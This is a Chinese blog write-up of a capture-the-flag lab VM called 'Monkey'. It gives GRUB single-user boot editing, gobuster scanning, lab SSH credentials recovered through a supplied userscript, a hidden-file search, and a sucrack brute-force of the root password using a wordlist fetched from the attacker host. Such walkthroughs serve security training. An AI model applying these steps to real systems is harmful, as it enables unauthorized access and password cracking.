---
title: "群友靶机之Monkey"
date: "2025-12-24 21:05:11"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/30095.html"
abbrlink: "30095"
---

```
获取靶机地址：
https://maze-sec.com/
qq群：660930334
```

# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33

reboot -f
```

# 端口扫描

![image-20251202185816480](/images/image-20251202185816480.png)

```
依旧是22,80端口
```

# 80端口探索

![image-20251202185929108](/images/image-20251202185929108.png)

```
进来是一个html，在源代码提示了个域名，依旧放到hosts当中8
sudo vim /etc/hosts
192.168.44.139 open.dsz
```

# 目录扫描

![image-20251202190156489](/images/image-20251202190156489.png)

```
这里出题人对dirsearch进行了限制，扫不出东西，换成gobuster来试试
```

![image-20251202191534557](/images/image-20251202191534557.png)

# tip点切入

```
出了两个文件，其实bak.zip里面就是monkey.js
给了一个js脚本，题目又提示篡改猴，在篡改猴里面保存脚本
【或者直接在域名下，浏览器控制台使用脚本】
去访问域名，因为脚本里面进行了限制，直接访问ip没有区别
```

![image-20251202191906762](/images/image-20251202191906762.png)

![image-20251202192338070](/images/image-20251202192338070.png)

![image-20251202192404625](/images/image-20251202192404625.png)

![](/images/image-20251202192438478.png)

![image-20251202192845077](/images/image-20251202192845077.png)

```
因为是随机的，不一定一下就获得正确的账号和密码
segfault/segfaultNo1
ssh segfault@192.168.44.142
```

![image-20251202193100118](/images/image-20251202193100118.png)

# 权限提升

```
sudo -l
/opt/monkey/bin/monkey
```

![image-20251202193147461](/images/image-20251202193147461.png)

```
给了一个猴子编程器，但是并没有什么点可以使用,查看相应的隐藏文件
find / -name '.*' 2>/dev/null
发现有一个hint文件
```

![image-20251202193527917](/images/image-20251202193527917.png)

```
提示给了一个爆破工具sucrack，那应该就是爆破root用户的密码
```

![image-20251202193654308](/images/image-20251202193654308.png)

```
在kali拿一个字典过来跑一下
python -m http.server
wget 192.168.44.128:8000/rockyou.txt
sucrack -a -w 20 -s 10 -u root -rl AFLafld rockyou.txt
```

![image-20251202194540419](/images/image-20251202194540419.png)

![image-20251202194706578](/images/image-20251202194706578.png)

